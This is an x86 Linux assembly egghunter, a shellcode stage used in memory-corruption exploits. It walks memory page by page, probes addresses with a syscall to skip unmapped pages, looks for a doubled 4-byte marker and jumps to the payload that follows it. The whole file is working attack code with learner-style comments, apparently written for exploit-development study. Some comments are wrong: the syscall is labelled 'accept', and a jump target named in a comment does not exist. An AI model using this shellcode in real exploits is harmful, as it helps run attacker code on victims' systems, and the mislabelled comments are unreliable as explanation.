global _start			

section .text
_start:
    ; lay our egg
    xor ebx, ebx
    xor ecx, ecx
    mov ebx, 0x50905090 ; value of l337, flipped for little endian
    mul ecx ; this one instruction sets both eax and edx to 0, this is because mul results are stored in EAX and EDX

    ; build page_align
    page_align:
    or dx, 0xfff ; set dx to 4095, 4096 contains nulls!!

    ; build next_addr
    next_addr:
    inc edx ; as explained above, necessary to move forward after or operation, to a multiple of 4096
    pushad ; push all registers onto the stack to preserve them during syscall
    lea ebx, [edx+4] ; point to path being validated
    mov al, 33 ; mov syscall value for accept
    int 0x80
    cmp al, 0xf2 ; after we interrupt, check if the return value that of EFAULT
    popad ; return the registers we preserved earlier
    je page_align ; if EFAULT present jump to page_align
    cmp [edx], ebx ; see if our egg is inside address of edx
    jne next_addr ; egg not inside? jump to address_check, otherwise continue
    cmp [edx+4], ebx ; perform second check to vet out our hunter from result]
    jne next_addr ; second egg not inside? jump to address_check, otherwise execute
    jmp edx ; jump to past where we found the egg and execute code
